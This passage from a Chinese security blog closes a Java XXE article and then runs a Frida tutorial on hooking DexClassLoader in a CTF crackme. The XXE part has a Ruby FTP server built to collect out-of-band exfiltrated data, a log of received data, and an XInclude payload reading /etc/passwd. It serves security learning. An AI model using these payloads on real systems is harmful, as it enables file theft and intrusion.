<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS Java1.8.0_121@</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&lt; EPSV ALL</span><br><span class="line">&lt; EPSV</span><br><span class="line">&lt; EPRT |1|172.17.29.150|60731|</span><br><span class="line">&lt; RETR test</span><br><span class="line">&lt; xxe</span><br><span class="line">&lt; ftp</span><br></pre></td></tr></table></figure>

<p>FTP Server代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;socket&#39;</span><br><span class="line">server &#x3D; TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data &#x3D; &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req &#x3D; client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>测试的结果(Centos)：</p>
<table>
<thead>
<tr>
<th>Java版本</th>
<th>是否能读换行</th>
<th>被截断的字符</th>
<th>其他报错的字符(什么都不能读)</th>
<th>被替换成换行的字符</th>
</tr>
</thead>
<tbody><tr>
<td>1.7.0_80</td>
<td>是</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
<tr>
<td>1.8.0_121</td>
<td>是</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
<tr>
<td>1.8.0_181</td>
<td>否</td>
<td># ?</td>
<td>% &amp; ‘</td>
<td>/</td>
</tr>
</tbody></table>
<p>可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -)</p>
<p>也可以把FTP换成HTTP协议，更加直观</p>
<h3 id="3-支持的Xinclude的XXE"><a href="#3-支持的Xinclude的XXE" class="headerlink" title="3.支持的Xinclude的XXE"></a>3.支持的Xinclude的XXE</h3><p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>详情可以查看<a href="https://www.anquanke.com/post/id/156227">浅析xml之xinclude &amp; xslt</a></p>
<h3 id="各平台支持协议如下："><a href="#各平台支持协议如下：" class="headerlink" title="各平台支持协议如下："></a>各平台支持协议如下：</h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png" alt="image-20211027165310121"></p>
<ol>
<li><a href="https://blog.spoock.com/2018/10/23/java-xxe/">JAVA常见的XXE漏洞写法和防御</a></li>
<li><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/">Java-XXE-总结</a></li>
<li><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java_XXE_漏洞</a></li>
</ol>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/">https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/</a></p>
<p><a href="https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5">https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Code_audit</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(下)</title>
    <url>/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/</url>
    <content><![CDATA[<p>​    上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。</p>
<p>​    这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。最终在虚拟机、测试机和frida中发现多种问题，之后更换测试机进行测试的时候仍然存在问题，留下了一部分搞不懂的地方，当个坑未，来找到解决问题在进行填补。</p>
<h1 id="文章涉及内容以及使用到的工具"><a href="#文章涉及内容以及使用到的工具" class="headerlink" title="文章涉及内容以及使用到的工具"></a><strong>文章涉及内容以及使用到的工具</strong></h1><h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADT（Android Developer Tools）</span><br><span class="line">Jadx-gui</span><br><span class="line">JEB</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">android源码包</span><br><span class="line">Nexus 6p（genymotion，实体机等亦可）</span><br></pre></td></tr></table></figure>

<h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java 泛型</span><br><span class="line">Java 反射机制</span><br><span class="line">DexClassLoader 动态加载机制</span><br><span class="line">Frida 基本操作</span><br><span class="line">Frida 创建任意类型数组（Java.array）</span><br><span class="line">Frida 类型转换（Java.cast）</span><br><span class="line">Frida 方法重载（overload）</span><br><span class="line">Frida Spawn</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h1 id="代码分析与构造"><a href="#代码分析与构造" class="headerlink" title="代码分析与构造"></a>代码分析与构造</h1><h2 id="Frida-Spawn的使用"><a href="#Frida-Spawn的使用" class="headerlink" title="Frida Spawn的使用"></a>Frida Spawn的使用</h2><p>​    通过上篇Robust的原理学习和对app的分析，我们知道Robust的其实就是在正常的使用<code>DexClassLoader</code>去动态加载文件，随后通过<code>反射</code>的方式去调用类方法或成员变量。</p>
<p>​    同时在上篇文章中，我们也知道Robust调用DexClassLoader的类是在<code>PatchExecutor</code>中，而调用PatchExecutor类是在一个叫<code>runRobust</code>的方法中，这个方法就在<code>MainActivity</code>中，并且在<code>onCreate</code>方法中调用。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813160714545.png" alt="image-20210813160714545"></p>
<p>现在我们明白了一点是，app动态加载dex的地方是在onCreate中，也就是说app一启动就执行了动态加载，并不是在我们点击按钮的时候。所以这个地方，我们要执行py脚本的话，需要在app执行onCreate方法之前。frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。</p>
<p>我们可以通过<code>-f</code>参数选项来实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -U -f cn.chaitin.geektan.crackme   &#x2F;&#x2F;app完整名</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida -U -f cn.chaitin.geektan.crackme                                                       1 ↵</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 15.1.1 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Spawned &#96;cn.chaitin.geektan.crackme&#96;. Use %resume to let the main thread start executing!</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt; %resume</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211108183528543.png" alt="image-20211108183528543"></p>
<p>运行一遍我们就可以从从上面可以看到，通过<code>-f</code>参数，frida会Spawned这个应用，在这个时候启动python脚本，再执行<code>%resume</code>命令,我们就可以在app执行onCreate方法前完成脚本的启动，这时候就能hook住onCreate中执行的一些方法。</p>
<h2 id="DexClassLoader-动态加载机制"><a href="#DexClassLoader-动态加载机制" class="headerlink" title="DexClassLoader 动态加载机制"></a>DexClassLoader 动态加载机制</h2><p>现在我们已经知道hook住onCreate中执行的方法了，现在我们就来试试，第一个目标是能获取到动态加载的dex中的类。在这直接我们来试一下直接去hook动态加载的类，会出现什么情况。</p>
<p>JS代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>我们首先启动通过frida启动，然后运行我们的脚本，在oncreate方法未调用前，运行我们的脚本，在使用%resume启动APP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.frida -U -f cn.chaitin.geektan.crackme</span><br><span class="line">2.python jscode.py</span><br><span class="line">3.%resume</span><br></pre></td></tr></table></figure>

<p>这里可以明显的看到输出了对应的错误信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]&#39;, &#39;stack&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js:124)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:443)\n    at value (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:812)\n    at _make (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:112)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:63)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:246)\n    at &lt;anonymous&gt; (&#x2F;script1.js:4)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:16)\n    at _performPendingVmOps (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:238)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:230)\n    at apply (native)\n    at ne (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:613)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:592)&#39;, &#39;fileName&#39;: &#39;frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js&#39;, &#39;lineNumber&#39;: 124, &#39;columnNumber&#39;: 1&#125;</span><br></pre></td></tr></table></figure>

<p>果不其然，这样去直接hook类肯定是不行的，但我们知道只要是从外部资源文件中动态加载dex，一般都是采用DexClassLoader动态加载的。学习过Java的同学应该知道，DexClassLoader动态加载的主要方法就是<code>loadClass()</code>。我们从Java源码上去分析一下，这里给大家一个java开发文档的查看地址：<a href="https://www.androidos.net.cn/android/8.0.0_r4/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java">访问</a></p>
<p>我们看到DexClassLoader的构造函数有4个参数，这里没有loadClass()，我们继续查看它的父类BaseDexClassLoader。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class DexClassLoader extends BaseDexClassLoader &#123;</span><br><span class="line">    public DexClassLoader(String dexPath, String optimizedDirectory,</span><br><span class="line">            String librarySearchPath, ClassLoader parent) &#123;</span><br><span class="line">        super(dexPath, new File(optimizedDirectory), librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样BaseDexClassLoader也没有loadClass()，最终在它的父类<code>ClassLoader</code>中找到了loadClass()方法。</p>
<p>可以看到DexClassLoader加载的逻辑其实就是ClassLoader中的loadClass()，它的机制简单的了解到这里，现在我们来试试，通过这样的方式能不能hook我们想要的类。</p>
<p>我们先hook DexClassLoader的构造函数，看看传递进的参数值是什么。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        &#x2F;&#x2F;创建一个DexClassLoader的wapper</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        &#x2F;&#x2F;hook 它的构造函数$init，我们将它的四个参数打印出来看看。</span><br><span class="line">        dexclassLoader.$init.implementation &#x3D; function(dexPath,optimizedDirectory,librarySearchPath,parent)&#123;</span><br><span class="line">             console.log(&quot;dexPath:&quot;+dexPath);</span><br><span class="line">            console.log(&quot;optimizedDirectory:&quot;+optimizedDirectory);</span><br><span class="line">             console.log(&quot;librarySearchPath:&quot;+librarySearchPath);</span><br><span class="line">            console.log(&quot;parent:&quot;+parent);</span><br><span class="line">            &#x2F;&#x2F;不破换它原本的逻辑，我们调用它原本的构造函数。</span><br><span class="line">          this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;down!&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行情况如下：</p>
<p>我们获取到了构造函数的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">down!</span><br><span class="line">dexPath:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache&#x2F;GeekTan&#x2F;patch_temp.jar</span><br><span class="line">optimizedDirectory:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache</span><br><span class="line">librarySearchPath:null</span><br><span class="line">parent:dalvik.system.PathClassLoader[DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;arm64, &#x2F;vendor&#x2F;lib64, &#x2F;system&#x2F;lib64]]]</span><br></pre></td></tr></table></figure>

<h2 id="Frida-方法重载（overload）"><a href="#Frida-方法重载（overload）" class="headerlink" title="Frida 方法重载（overload）"></a>Frida 方法重载（overload）</h2><p>我们来尝试获取一下动态加载的类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined；</span><br><span class="line">        &#x2F;&#x2F;hook loadClass方法</span><br><span class="line">        dexclassLoader.loadClass.implementation &#x3D; function(name)&#123;</span><br><span class="line">        &#x2F;*因为loadClass可能会加载很多类，所以我们得定义个hookname变量，</span><br><span class="line">        这样有针对的获取我们想要的类*&#x2F;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行看看结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &quot;Error: loadClass(): has more than one overload, use</span><br><span class="line">.overload(&lt;signature&gt;) to choose from:.overload(&#39;java.lang.String&#39;)</span><br><span class="line">.overload(&#39;java.lang.String&#39;, &#39;boolean&#39;)&quot;....&#125;</span><br></pre></td></tr></table></figure>

<p>发现frida报错了，从报错信息我们可以发现loadClass()有2个重载方法，我们这里需要通过overload指定我们要HOOK的重载方法才行，如果不知道重载哪一个然后可以先让报错在进行操作</p>
<p>ClassLoader类中的两个loadClass重载方法</p>
<p>loadClass(String name)；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        return loadClass(name, false);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>loadClass(String name, boolean resolve)；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">        throws ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">            &#x2F;&#x2F; First, check if the class has already been loaded</span><br><span class="line">            Class&lt;?&gt; c &#x3D; findLoadedClass(name);</span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (parent !&#x3D; null) &#123;</span><br><span class="line">                        c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    &#x2F;&#x2F; ClassNotFoundException thrown if class not found</span><br><span class="line">                    &#x2F;&#x2F; from the non-null parent class loader</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F; If still not found, then invoke findClass in order</span><br><span class="line">                    &#x2F;&#x2F; to find the class.</span><br><span class="line">                    c &#x3D; findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到真正执行loadClass的方法是<code>loadClass(String name, boolean resolve)；</code>, 那么我们可以hook第一个，然后在其调用第二个重载方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">           &#x2F;&#x2F;定义一个String变量，指定我们需要的类</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            &#x2F;&#x2F;直接调用第二个重载方法，跟原本的逻辑相同。</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            &#x2F;&#x2F;如果loadClass的name参数和我们想要hook的类名相同</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                &#x2F;&#x2F;则拿到它的值</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                &#x2F;&#x2F;打印hookClass变量的值</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                send(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cn.chaitin.geektan.crackme.MainActivityPatch</span><br><span class="line">[*] &lt;instance: java.lang.Class&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到我们已经通过hook loadClass拿到了MainActivityPatch类</p>
<h2 id="Frida-类型转换（Java-cast）"><a href="#Frida-类型转换（Java-cast）" class="headerlink" title="Frida 类型转换（Java.cast）"></a>Frida 类型转换（Java.cast）</h2><p>这里我们是不能直接通过(.)运算符直接调用方法的，可以看到loadClass()返回类型的是一个泛型，其中？代表任何类型，因为loadClass(）也不知道要加载的类的类型，所以返回类型就采用<code>Class&lt;?&gt;</code>代表所有类型的类，所以最后返回的是一个类型为指向<code>MainActivityPatch</code>的Class对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)；</span><br></pre></td></tr></table></figure>

<p>理论是这样的，但实际上却不是，我们还需要进行类型转换。这里Frida提供的一个方法处理泛型的方法<code>Java.cast</code>。<br>构造代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var constructorclass &#x3D; Java.use(&quot;java.lang.reflect.Constructor&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                console.log(&quot;------------------------------CAST--------------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;类型转换</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                &#x2F;&#x2F;调用getMethods()获取类下的所有方法</span><br><span class="line">                var methods &#x3D; hookClassCast.getMethods();</span><br><span class="line">                console.log(methods);</span><br><span class="line">                console.log(&quot;-----------------------------NOT CAST-----------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;未进行类型转换，看看能否调用getMethods()方法</span><br><span class="line">                var methodtest &#x3D; hookClass.getMethods();</span><br><span class="line">                console.log(methodtest);</span><br><span class="line">                console.log(&quot;---------------------OVER------------------------&quot;)</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221120607031.png" alt="image-20211221120607031"></p>
<p>我们可以看到cast后才能调用getMethods(),没有cast则会报为定义不能调用的错误。</p>
<h2 id="Frida创建任意类型数组（Java-array）"><a href="#Frida创建任意类型数组（Java-array）" class="headerlink" title="Frida创建任意类型数组（Java.array）"></a>Frida创建任意类型数组（Java.array）</h2><p>现在我们得到了一个类型为<code>MainActivityPatch</code>的Class对象，我们接下来就来看看怎么调用<code>Joseph</code>方法。在这之前，你需要对反射的用法有一定的了解。至于怎么用，就针对实际情况选取你认为最好的办法就行了。<br>当然在我多次踩坑之后，比如：</p>
<ul>
<li>在Class的getMethod方法中，怎么用js构造<code>int.class</code>,<code>float.class</code>，以及构造Integer.TYPE数组出现莫名错误。</li>
<li>怎么利用Frida函数构造任意类型的数组。</li>
<li>无参构造函数调用newInstance()，跟有参构造函数调用newInstance()的问题。</li>
<li>….</li>
</ul>
<p>我认为还是有必要给大家提供一种<code>比较通用</code>的方法。<br>1.利用getDeclaredConstructor()获取具有指定参数列表构造函数的Constructor。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="line">     throws NoSuchMethodException, SecurityException &#123;</span><br><span class="line">     return getConstructor0(parameterTypes, Member.DECLARED);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，参数是一个Class&lt;?&gt;…，也就是说这是一个[Ljava.lang.Object;类型的数组。我们现在要到MainActivity</p>
<p>Patch构造函数对象，从代码中可以知道参数是Object类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public MainActivityPatch(Object obj)&#123;</span><br><span class="line">		this.orginClass &#x3D; (MainActivity) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们如何构造并传入这个数组呢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\利用java.array的标准写法</span><br><span class="line">var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line"> </span><br><span class="line">\\偷懒写法</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor([objectclass.class]);</span><br></pre></td></tr></table></figure>

<p>Java.array()的用法格式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.array(&#39;type&#39;,[value1,value2,....]);</span><br></pre></td></tr></table></figure>

<p>支持什么type，大家可以参看<code>frida-java</code>的<a href="https://github.com/frida/frida-java">源码</a>。在<code>class-factory.js</code>中就可以找到了。基本类型如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Z -- boolean</span><br><span class="line">2. B -- byte</span><br><span class="line">3. C -- char</span><br><span class="line">4. S -- short</span><br><span class="line">5. I --  int</span><br><span class="line">6. J -- long</span><br><span class="line">7. F -- float</span><br><span class="line">8. D  -- double</span><br><span class="line">9. V -- void</span><br></pre></td></tr></table></figure>

